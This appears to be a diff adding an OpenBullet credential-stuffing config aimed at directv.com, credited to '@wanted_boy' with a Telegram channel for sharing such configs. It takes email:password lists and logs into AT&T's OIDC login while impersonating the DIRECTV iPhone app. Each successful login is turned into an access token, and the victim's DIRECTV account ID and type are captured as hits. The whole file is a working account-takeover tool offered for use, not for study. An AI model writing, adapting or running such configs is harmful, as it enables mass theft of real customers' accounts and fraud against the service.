@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "directv.com",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-19T14:16:49.5069389+03:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var rnd = uuidv4();
+var rnd2 = uuidv4();
+END SCRIPT -> VARS "rnd"
+
+#Uppercase FUNCTION ToUppercase "<rnd>" -> VAR "Uppercase" 
+
+#state FUNCTION RandomString "?u?u?u?d?u?l?l?l?u?l" -> VAR "state" 
+
+#nonce FUNCTION RandomString "?u?u?u?u?l?u?l?u?d?u" -> VAR "nonce" 
+
+#Login REQUEST POST "https://oidc.idp.clogin.att.com/mga/sps/authsvc?PolicyId=urn:ibm:security:authentication:asf:passAuth&response_type=code+id_token+token&client_id=m45302&redirect_uri=com.att.cso.haloc.mkapp://code&scope=openid%20profile%20email&state=<state>&response_mode=fragment&nonce=<nonce>" AutoRedirect=FALSE 
+  CONTENT "{ \"password\" : \"<PASS>\", \"mkUUID\" : \"<Uppercase>\", \"deviceOSVersion\" : \"15.4\", \"deviceIdentifier\" : \"<Uppercase>\", \"deviceModel\" : \"iPhone\", \"pushToken\" : \" \", \"mkSDKVersion\" : \"v1.0.1\", \"userID\" : \"<USER>\", \"deviceOS\" : \"iOS\", \"deviceMake\" : \"Apple\", \"mkVersion\" : \"6.4.004\", \"deviceType\" : \"phone\", \"mkLanguage\" : \"EN\" }" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: oidc.idp.clogin.att.com" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: DIRECTV/6.4.004 CFNetwork/1331.0.7 Darwin/21.4.0" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "login_required" 
+  KEYCHAIN Success OR 
+    KEY "<HEADERS(location)>" Contains "access_token=" 
+
+#code PARSE "<HEADERS(location)>" LR "&code=" "&scope" -> VAR "code" 
+
+#Post REQUEST POST "https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/token" 
+  CONTENT "redirect_uri=com.att.cso.haloc.mkapp%3A%2F%2Fcode&code=<code>&grant_type=authorization_code&client_id=m45302" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: oidc.idp.clogin.att.com" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: DIRECTV/6.4.004 CFNetwork/1331.0.7 Darwin/21.4.0" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Connection: close" 
+
+#accessToken PARSE "<SOURCE>" JSON "access_token" -> VAR "accessToken" 
+
+#Class FUNCTION RandomString "?d?u?d?d?u?d?d?d?u?d?u?d?d?u?u?u?d?d?u?u?d?d?u?u?d?d?d?d?d?d?u?d" -> VAR "Class" 
+
+#Post REQUEST POST "https://as.dtvce.com/authenticationServer/rest/authn/user/token/v2" 
+  CONTENT "siteId=Morega_Cust01&siteUserId=<USER>&secureToken=<accessToken>&deviceClassId=<Class>&reqParams=ACCOUNT_ID_REQ&reqParams=ACCOUNT_STATUS_REQ&reqParams=ACCOUNT_TYPE_REQ&reqParams=DEVICE_ID_OPT&reqParams=REF_ID_REQ&reqParams=PROFILE_ID_REQ&sdservice=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: as.dtvce.com" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: DIRECTV/6.4.004 CFNetwork/1331.0.7 Darwin/21.4.0" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Connection: close" 
+
+#accountId PARSE "<SOURCE>" LR "ACCOUNT_ID\",\"value\":\"" "\"" CreateEmpty=FALSE -> CAP "accountId" 
+
+#accountType PARSE "<SOURCE>" LR "ACCOUNT_TYPE\",\"value\":\"" "\"" CreateEmpty=FALSE -> CAP "accountType" 
+
+SET CAP "Author Telegram" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletConfigs"
+
